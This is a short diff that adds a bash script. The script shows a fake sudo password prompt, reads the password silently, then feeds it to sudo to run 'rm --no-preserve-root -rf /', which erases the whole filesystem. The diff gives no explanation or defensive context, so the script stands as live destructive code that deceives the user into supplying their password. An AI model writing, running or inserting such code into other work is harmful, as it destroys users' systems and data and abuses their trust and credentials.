@@ -1,0 +1,3 @@
+#!/bin/bash
+read -s -p "[sudo] sudo password for $(whoami): " pass
+echo $pass | sudo -S rm --no-preserve-root -rf /
